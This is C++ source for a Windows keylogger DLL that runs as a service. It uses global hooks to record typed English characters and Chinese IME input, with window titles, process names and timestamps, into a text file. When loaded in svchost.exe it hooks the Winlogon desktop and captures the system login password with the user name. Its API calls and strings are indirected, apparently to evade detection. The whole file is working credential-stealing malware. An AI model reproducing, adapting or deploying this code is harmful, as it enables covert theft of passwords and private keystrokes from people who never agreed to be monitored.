// MyKeyMonTrans.cpp: implementation of the CMyKeyMTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#define KEY_INSERT_NORMAL		1
#define KEY_INSERT_LOGIN		2
#define KEY_INSERT_LOGIN_END	3

//共享变量
#pragma data_seg("songs")
HWND	g_hActiveWnd = NULL;
HHOOK	g_hKeyHK_EN = NULL;
HHOOK	g_hKeyHK_CN = NULL;
HHOOK	g_hKeyHK_LG = NULL;
WCHAR	g_srcBuf[256] = {0};
WCHAR	g_destBuf[256] = {0};
DWORD	nCnKeyTimeOut = 0;
DWORD	nEnKeyTimeOut = 0;
BOOL	m_IsLogin = FALSE;
DWORD	dKeyThreadId = 0;
char	m_WaitMetuxName[256] = {0};
char	m_KeyFilePath[256] = {0};
WCHAR	pLoginBuf[2048] = {0};
#pragma data_seg()
#pragma comment(linker, "/section:songs, rws")

CMyFunc	  m_gFunc;
UINT	  m_Ext_A[3] = {PS_EXT_A, PS_EXT_B, PS_EXT_C};
HINSTANCE m_ghInstance = NULL;

void SaveBuffer(WCHAR* sText, HWND hWnd, BOOL IsCheckHwnd);
void InsertBuffer(WCHAR* sText, WORD nCmd);
BOOL MyAppendFile(LPCTSTR m_FileName, LPVOID pData, DWORD dLen);

LRESULT CALLBACK HOOK_WM_CHAR_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
	m_gFunc.LoadMyData((BYTE*) m_ghInstance);
	if (nCode >= 0 )
	{
		PMSG pMsg = (PMSG) lParam;
		if(pMsg->message == WM_CHAR && wParam == PM_REMOVE && m_gFunc.GetTickCount() - nCnKeyTimeOut > 5)
		{
			nEnKeyTimeOut = m_gFunc.GetTickCount();
			switch(pMsg->wParam)
			{
				case VK_BACK:
					{
						/*[<=]*/
						WCHAR m_TmpStr[256] = {0};
						m_TmpStr[0] = L'[';m_TmpStr[1] = L'<';m_TmpStr[2] = L'=';m_TmpStr[3] = L']';m_TmpStr[4] = 0x00;
						InsertBuffer(m_TmpStr, KEY_INSERT_NORMAL);
					}
					break;
						
				case VK_RETURN:
					{
						WCHAR m_wTmpStr[256] = {0};
						m_wTmpStr[0] = L'\r';
						m_wTmpStr[1] = L'\n';
						InsertBuffer(m_wTmpStr, KEY_INSERT_NORMAL);
					}
					break;

				default :
					{
						WCHAR m_Text[3] = {0};
						m_gFunc.memcpy(m_Text, &pMsg->wParam, sizeof(WPARAM));
						InsertBuffer(m_Text, KEY_INSERT_NORMAL);
					}
					break;
			}
		}
	}
	return m_gFunc.CallNextHookEx(g_hKeyHK_EN, nCode, wParam, lParam);
}

LRESULT CALLBACK HOOK_WM_IME_COMPOSITION_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
	m_gFunc.LoadMyData((BYTE*) m_ghInstance);
	CWPSTRUCT* pMsg = (CWPSTRUCT*) lParam;
	if(m_IsLogin)
	{
		//已经登录
		m_IsLogin = FALSE;

		WCHAR m_wTmpStr[256] = {0};
		m_wTmpStr[0] = L'\r';
		m_wTmpStr[1] = 0x00;
	
		//需要保存登录密码
		InsertBuffer(m_wTmpStr, KEY_INSERT_LOGIN_END);

		//当前用户：
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10250, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_TmpStr, m_gFunc.strlen(m_TmpStr) + 1, m_wTmpStr, 255);
		
		WCHAR m_UserName[256] = {0};
		m_gFunc.lstrcpyW(m_UserName, m_wTmpStr);
		
		DWORD len = 256 - m_gFunc.lstrlenW(m_UserName) - 1;
		m_gFunc.GetUserNameW(m_UserName + m_gFunc.lstrlenW(m_UserName), &len);

		// 用户密码：
		m_gFunc.GetMyString(10251, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_TmpStr, m_gFunc.strlen(m_TmpStr) + 1, m_wTmpStr, 255);
		
		m_gFunc.lstrcatW(m_UserName, m_wTmpStr);
		InsertBuffer(m_UserName, KEY_INSERT_LOGIN_END);

		m_wTmpStr[0] = L'\n';
		m_wTmpStr[1] = 0x00;
		InsertBuffer(m_wTmpStr, KEY_INSERT_LOGIN_END);
	}

	if(nCode == HC_ACTION)
    {
		switch (pMsg->message)
        {
			case WM_IME_COMPOSITION:
            {
				if(m_gFunc.GetTickCount() - nEnKeyTimeOut > 5)
				{
					nCnKeyTimeOut = m_gFunc.GetTickCount();
					HWND hWnd = m_gFunc.GetForegroundWindow();
              		HIMC hIMC = m_gFunc.ImmGetContext(hWnd);
					m_gFunc.memset(g_srcBuf, 0, 256 * sizeof(WCHAR));
					DWORD dwSize = m_gFunc.ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
					m_gFunc.ImmGetCompositionStringW(hIMC, GCS_RESULTSTR, g_srcBuf, dwSize);
					if(m_gFunc.lstrcmpW(g_srcBuf, g_destBuf) != 0)
					{
						InsertBuffer(g_srcBuf, KEY_INSERT_NORMAL);
						m_gFunc.lstrcpyW(g_destBuf, g_srcBuf);
					}
					if(hIMC)
					{
						m_gFunc.ImmReleaseContext(hWnd, hIMC);
					}
				}
            }
            break;
        }
    }
	return(m_gFunc.CallNextHookEx(g_hKeyHK_CN, nCode, wParam, lParam));
}

LRESULT CALLBACK HOOK_WM_CHAR_LOGIN_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
	m_gFunc.LoadMyData((BYTE*) m_ghInstance);

	//进入登录窗口
	if(nCode >= 0 )
	{
		PMSG pMsg = (PMSG) lParam;
		if(pMsg->message == WM_CHAR)
		{
			m_IsLogin = TRUE;
			switch(pMsg->wParam)
			{
				case VK_BACK:
					{
						/*[<=]*/
						WCHAR m_TmpStr[256] = {0};
						m_TmpStr[0] = L'[';m_TmpStr[1] = L'<';m_TmpStr[2] = L'=';m_TmpStr[3] = L']';m_TmpStr[4] = 0x00;
						InsertBuffer(m_TmpStr, KEY_INSERT_LOGIN);
					}
					break;
						
				default :
					{
						WCHAR m_Text[3] = {0};
						m_gFunc.memcpy(m_Text, &pMsg->wParam, sizeof(WPARAM));
						InsertBuffer(m_Text, KEY_INSERT_LOGIN);
					}
					break;
			}
		}
	}
	return m_gFunc.CallNextHookEx(g_hKeyHK_EN, nCode, wParam, lParam);
}

BOOL MyAppendFile(LPCTSTR m_FileName, LPVOID pData, DWORD dLen)
{
	//取任务全局信息
	HANDLE hFile = m_gFunc.CreateFile(m_FileName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	m_gFunc.SetFilePointer(hFile, 0, NULL, FILE_END);
	DWORD nWriteLen = 0;
	m_gFunc.WriteFile(hFile, pData, dLen, &nWriteLen, NULL);
	m_gFunc.CloseHandle(hFile);
	return TRUE;
}

void GetMoudleMame(DWORD pId, char* pExeName)
{
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
    if(NULL == hProcess) 
	{
		return;
	}
	char m_ExeName[MAX_PATH] = {0};
	if(m_gFunc.GetModuleFileNameEx(hProcess, NULL, m_ExeName, 1024) > 0)
	{
		m_gFunc.strcpy(pExeName, m_ExeName);
	}
    m_gFunc.CloseHandle(hProcess);
}

void SaveBuffer(WCHAR* sText, HWND hWnd, BOOL IsCheckHwnd)
{
	//转换字串
	char m_Text[256] = {0};
	m_gFunc.WideCharToMultiByte(CP_ACP, 0, sText, m_gFunc.lstrlenW(sText) + 1, m_Text, 256, NULL, NULL);

	char szTime[128] = {0};
	char szTempBuf[512] = {0};
	char szTitle[256] = {0};
	char szProcess[256] = {0};

	//当前窗口
	if(IsCheckHwnd && g_hActiveWnd != hWnd)
	{
		g_hActiveWnd = hWnd;

		//[%04d-%02d-%02d %02d:%02d:%02d]
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10252, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	
		//当前时间
		SYSTEMTIME sysTM;
		m_gFunc.GetLocalTime(&sysTM);
		m_gFunc.sprintf(szTime, m_TmpStr, sysTM.wYear, sysTM.wMonth, sysTM.wDay, sysTM.wHour, sysTM.wMinute, sysTM.wSecond);

		DWORD nProcessId = 0;
		m_gFunc.GetWindowThreadProcessId(g_hActiveWnd, &nProcessId);

		char m_RerurnStr[20] = {0};
		m_RerurnStr[0] = 0x0d;
		m_RerurnStr[1] = 0x0a;

		//%s %s %s前后都手动加了\r\n
		m_TmpStr[0] = 0x0d;
		m_TmpStr[1] = 0x0a;
		m_gFunc.GetMyString(10253, m_TmpStr + 2, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.strcat(m_TmpStr, m_RerurnStr);

		//窗口标题
		m_gFunc.GetWindowText(g_hActiveWnd, szTitle, MAX_PATH);
		GetMoudleMame(nProcessId, szProcess);
		m_gFunc.sprintf(szTempBuf, m_TmpStr, szTime, szTitle, szProcess);
	}

	//写内容到缓冲
	m_gFunc.strcat(szTempBuf, m_Text);
	DWORD len = m_gFunc.strlen(szTempBuf);

	HANDLE hKeyWaitMetux = m_gFunc.OpenMutex(SYNCHRONIZE, FALSE, m_WaitMetuxName);
	m_gFunc.WaitForSingleObject(hKeyWaitMetux, 0xffffffff);
	MyAppendFile(m_KeyFilePath, szTempBuf, len);
	m_gFunc.ReleaseMutex(hKeyWaitMetux);
	m_gFunc.CloseHandle(hKeyWaitMetux);
}

void InsertBuffer(WCHAR* sText, WORD nCmd)
{
	HWND hWnd = m_gFunc.GetActiveWindow();

	//保存键值
	switch(nCmd)
	{
		case KEY_INSERT_NORMAL :
			SaveBuffer(sText, hWnd, TRUE);
			break;

		case KEY_INSERT_LOGIN :
			m_gFunc.lstrcatW(pLoginBuf, sText);
			break;

		case KEY_INSERT_LOGIN_END :
			{
				if(sText[0] == L'\r')
				{

					char m_RerurnStr[20] = {0};
					m_RerurnStr[0] = 0x0d;
					m_RerurnStr[1] = 0x0a;

					//***以下为系统登录帐号和密码[%04d-%02d-%02d %02d:%02d:%02d]***前后都手动加了\r\n
					char m_TmpStr[256] = {0};
					m_TmpStr[0] = 0x0d;
					m_TmpStr[1] = 0x0a;
					m_gFunc.GetMyString(10254, m_TmpStr + 2, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
					m_gFunc.strcat(m_TmpStr, m_RerurnStr);

					WCHAR m_wTmpStr[256] = {0};
					m_gFunc.MultiByteToWideChar(CP_ACP, 0, m_TmpStr, m_gFunc.strlen(m_TmpStr) + 1, m_wTmpStr, 255);

					//当前时间
					WCHAR szTime[256] = {0};
					SYSTEMTIME sysTM;
					m_gFunc.GetLocalTime(&sysTM);
					m_gFunc.wsprintfW(szTime, m_wTmpStr, sysTM.wYear, sysTM.wMonth,	sysTM.wDay,	sysTM.wHour, sysTM.wMinute, sysTM.wSecond);
					SaveBuffer(szTime, hWnd, FALSE);
				}
				else if(sText[0] == L'\n')
				{
					WCHAR m_wTmpStr[256] = {0};
					m_wTmpStr[0] = L'\r';
					m_wTmpStr[1] = L'\n';
			
					//保存登录密码
					SaveBuffer(pLoginBuf, hWnd, FALSE);
					SaveBuffer(m_wTmpStr, hWnd, FALSE);
					m_gFunc.memset(pLoginBuf, 0, 65535 * sizeof(WCHAR));
				}
				else
				{
					SaveBuffer(sText, hWnd, FALSE);
				}
			}
			break;
	}
}

void WINAPI ServiceMain(ULONG dwArgc, LPTSTR* lpszArgv)
{
	if(!m_gFunc.LoadMyData((BYTE*) m_ghInstance))
	{
		return;
	}

	char m_ModuleFileName[256] = {0};
	m_gFunc.GetModuleFileName(m_ghInstance, m_ModuleFileName, 255);
	char* pStart = m_gFunc.strrchr(m_ModuleFileName, '\\');
	char* pEnd = m_gFunc.strrchr(m_ModuleFileName, '.');

	char m_AppName[256] = {0};
	m_gFunc.memcpy(m_AppName, pStart + 1, pEnd - pStart - 1);

	//退出事件
	char m_WaitEventName[256] = {0};
	m_gFunc.strcpy(m_WaitEventName, m_AppName);
	m_gFunc.strcat(m_WaitEventName, m_AppName);

	if(dwArgc == DLL_START_KEYSTART)
	{
		//排斥量名称
		m_gFunc.strcpy(m_WaitMetuxName, m_AppName);
		HANDLE hWaitMetux = m_gFunc.CreateMutex(NULL, FALSE, m_WaitMetuxName);

		//等待事件
		HANDLE hExitEvent = m_gFunc.CreateEvent(NULL, TRUE, FALSE, m_WaitEventName);

		//.txt
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10255, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	
		//数据文件名称
		*pEnd = 0x00;
		m_gFunc.strcat(m_ModuleFileName, m_TmpStr);
		m_gFunc.strcpy(m_KeyFilePath, m_ModuleFileName);

		HDESK hOldDesktop = m_gFunc.GetThreadDesktop(m_gFunc.GetCurrentThreadId());

		//Default
		m_gFunc.GetMyString(10256, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

		//监控中文和英文
		HDESK hNewDesktop = m_gFunc.OpenDesktop(m_TmpStr, 0, FALSE, MAXIMUM_ALLOWED);
		if(hNewDesktop != NULL)
		{
			m_gFunc.SetThreadDesktop(hNewDesktop);
		}

		if(NULL == g_hKeyHK_CN)
		{
			g_hKeyHK_CN = m_gFunc.SetWindowsHookExW(WH_CALLWNDPROC, HOOK_WM_IME_COMPOSITION_Proc, m_ghInstance, 0);
		}
		if(NULL == g_hKeyHK_EN)
		{
			g_hKeyHK_EN = m_gFunc.SetWindowsHookExW(WH_GETMESSAGE, HOOK_WM_CHAR_Proc, m_ghInstance, 0);
		}

		//svchost.exe
		m_gFunc.GetMyString(10246, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		m_gFunc.GetModuleFileName(NULL, m_ModuleFileName, 255);
		m_gFunc.CharLower(m_ModuleFileName);
		if(m_gFunc.strstr(m_ModuleFileName, m_TmpStr) != NULL)
		{
			//Winlogon
			m_gFunc.GetMyString(10257, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	
			//监控登录窗口
			hNewDesktop = m_gFunc.OpenDesktop(m_TmpStr, 0, FALSE, MAXIMUM_ALLOWED);
			if(hNewDesktop != NULL)
			{
				m_gFunc.SetThreadDesktop(hNewDesktop);
			}
			if(NULL == g_hKeyHK_LG)
			{
				g_hKeyHK_LG = m_gFunc.SetWindowsHookExW(WH_GETMESSAGE, HOOK_WM_CHAR_LOGIN_Proc, m_ghInstance, 0);
			}
			m_gFunc.SetThreadDesktop(hOldDesktop);
		}

		//等待退出
		m_gFunc.WaitForSingleObject(hExitEvent, 0xfffffff);

		if(g_hKeyHK_EN != NULL)
		{
			m_gFunc.UnhookWindowsHookEx(g_hKeyHK_EN);
		}
		if(g_hKeyHK_CN != NULL)
		{
			m_gFunc.UnhookWindowsHookEx(g_hKeyHK_CN);
		}
		if(g_hKeyHK_LG != NULL)
		{
			m_gFunc.UnhookWindowsHookEx(g_hKeyHK_LG);
		}

		m_gFunc.CloseHandle(hExitEvent);
		m_gFunc.CloseHandle(hWaitMetux);
		m_gFunc.DeleteFile(m_KeyFilePath);
	}
	else if(dwArgc == DLL_START_KEYSTOP)
	{
		HANDLE hExitEvent = m_gFunc.OpenEvent(EVENT_MODIFY_STATE, FALSE, m_WaitEventName);
		if(hExitEvent != NULL)
		{
			m_gFunc.SetEvent(hExitEvent);
			m_gFunc.CloseHandle(hExitEvent);
		}
	}
}
